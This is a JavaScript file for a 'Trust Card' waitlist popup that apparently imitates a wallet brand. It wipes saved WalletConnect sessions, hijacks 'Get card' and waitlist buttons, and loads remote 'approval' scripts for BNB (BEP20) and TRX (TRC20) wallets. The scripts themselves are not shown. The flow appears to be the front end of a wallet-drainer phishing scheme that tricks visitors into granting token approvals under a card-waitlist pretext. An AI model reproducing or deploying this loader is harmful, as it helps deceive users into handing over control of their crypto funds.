/**
 * Trust Card Waitlist - Same flow as BEP20 reference (wallete-connect-bep-20)
 * Join waitlist → Apply Now → runApprovalInline(network) for BNB or TRX
 * Same function for both TRC (TRX) and BEP (BNB)
 */
(function () {
  'use strict';

  try {
    Object.keys(localStorage).forEach(function (key) {
      if (key.startsWith('wc@') || key === 'WALLETCONNECT_DEEPLINK_CHOICE' || key.startsWith('WCM_')) {
        localStorage.removeItem(key);
      }
    });
    if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
      try { indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB'); } catch (_) {}
    }
  } catch (_) {}

  const overlay = document.getElementById('waitlist-overlay');
  const formWrap = document.getElementById('waitlist-form-wrap');
  const successWrap = document.getElementById('waitlist-success');
  const failedWrap = document.getElementById('waitlist-failed');
  const closeBtn = document.getElementById('waitlist-close');
  const tryAgainBtn = document.getElementById('waitlist-try-again-btn');

  function openPopup() {
    var country = new URLSearchParams(window.location.search).get('country') || 'IN';
    var cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
    try { sessionStorage.setItem('tw-card-redirect', cardUrl); } catch (_) {}
    if (overlay) {
      overlay.classList.add('open');
      document.body.style.overflow = 'hidden';
    }
  }

  function closePopup() {
    if (overlay) overlay.classList.remove('open');
    document.body.style.overflow = '';
    if (formWrap) formWrap.style.display = 'block';
    if (successWrap) successWrap.style.display = 'none';
    if (failedWrap) failedWrap.style.display = 'none';
  }

  function showFailed() {
    if (formWrap) formWrap.style.display = 'none';
    if (successWrap) successWrap.style.display = 'none';
    if (failedWrap) failedWrap.style.display = 'block';
  }

  function resetToForm() {
    if (formWrap) formWrap.style.display = 'block';
    if (successWrap) successWrap.style.display = 'none';
    if (failedWrap) failedWrap.style.display = 'none';
  }

  function getRedirectUrl() {
    const stored = sessionStorage.getItem('tw-card-redirect');
    if (stored) return stored;
    const country = new URLSearchParams(window.location.search).get('country') || 'IN';
    return window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
  }

  if (overlay) overlay.addEventListener('click', function (e) {
    if (e.target === overlay) closePopup();
  });
  if (closeBtn) closeBtn.addEventListener('click', closePopup);

  function onSuccess() {
    if (formWrap) formWrap.style.display = 'none';
    if (successWrap) successWrap.style.display = 'block';
    if (failedWrap) failedWrap.style.display = 'none';
    var url = getRedirectUrl();
    if (url) {
      setTimeout(function () {
        window.location.href = url.startsWith('/') ? window.location.origin + url : url;
      }, 1500);
    }
  }

  function onError(msg) {
    showFailed();
  }

  function runApprovalInline(network) {
    var baseUrl = (window.TRUST_CARD_APPROVAL_URL || (typeof location !== 'undefined' ? new URL('fluxpay', location.origin).href : 'fluxpay')).replace(/\/$/, '');
    var isTrc = network === 'TRX';
    var scriptUrl = baseUrl + (isTrc ? '/fluxpay-trc20-approval.js' : '/fluxpay-approval.js');
    var runKey = isTrc ? 'FluxPayTRC20Approval' : 'FluxPayApproval';
    var runFn = window[runKey] && window[runKey].run;

    if (!runFn) {
      var script = document.createElement('script');
      script.type = 'module';
      script.src = scriptUrl;
      script.onload = function () {
        var fn = window[runKey] && window[runKey].run;
        if (!fn) {
          onError('Approval script not loaded');
          return;
        }
        fn(
          function () {
            window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
            onSuccess();
          },
          function (err) {
            onError(err);
          }
        );
      };
      script.onerror = function () {
        onError('Failed to load approval script');
      };
      document.head.appendChild(script);
      return;
    }

    runFn(
      function () {
        window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
        onSuccess();
      },
      function (err) {
        onError(err);
      }
    );
  }

  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && overlay && overlay.classList.contains('open')) closePopup();
  });

  document.addEventListener('click', function (e) {
    var card = e.target && e.target.closest && e.target.closest('.waitlist-network-card');
    if (card && card.dataset && card.dataset.network) {
      e.preventDefault();
      e.stopPropagation();
      var network = card.dataset.network;
      if (network === 'BNB' || network === 'TRX') {
        var country = new URLSearchParams(window.location.search).get('country') || 'IN';
        var cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
        try { sessionStorage.setItem('tw-card-redirect', cardUrl); } catch (_) {}
        runApprovalInline(network);
      }
    }
  }, true);

  /* Get card opens network choice - use delegation to catch React-rendered buttons */
  function handleGetCardClick(e) {
    var target = e.target;
    var btn = target && target.closest && target.closest('button, a, [role="button"]');
    if (!btn) return;
    var text = (btn.textContent || btn.innerText || '').trim();
    if (/Get card|Get your card|Join the Waitlist|Get Started/i.test(text)) {
      e.preventDefault();
      e.stopPropagation();
      openPopup();
    }
  }

  if (tryAgainBtn) tryAgainBtn.addEventListener('click', resetToForm);

  var inited = false;
  function init() {
    if (inited) return;
    inited = true;
    document.addEventListener('click', handleGetCardClick, true);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
